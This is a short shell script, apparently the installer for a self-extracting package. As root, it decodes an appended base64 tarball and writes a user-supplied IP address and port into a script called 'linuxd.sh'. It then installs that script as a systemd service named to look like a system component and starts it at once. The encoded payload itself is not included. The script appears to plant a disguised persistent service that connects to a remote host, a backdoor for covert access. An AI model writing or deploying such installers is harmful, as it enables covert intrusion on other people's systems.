[ $(id -u) -ne 0 ] && echo root is required && exit 1
[ $# -lt 2 ] && echo needs argument IP and PORT && exit 1
[[ $0 = '/bin/*' ]] && echo invalid script && exit 1
offset=TARBALL_OFFSET
temp=$(mktemp -d)
cp $0 $temp/install.sh
cd $temp
tail -n +$offset install.sh | base64 -d > tarball.tar
tar xf tarball.tar
chmod +x linuxd.sh
sed -i "s,IP_ADDRESS,$1," linuxd.sh
sed -i "s,PORT,$2," linuxd.sh
mv linuxd.sh /usr/lib/linuxd
mv systemd-linuxd.service /usr/lib/systemd/system/systemd-linuxd.service
systemctl enable systemd-linuxd.service --now
cd -
rm -rf $temp
exit
=== ENCODED TARBALL ===
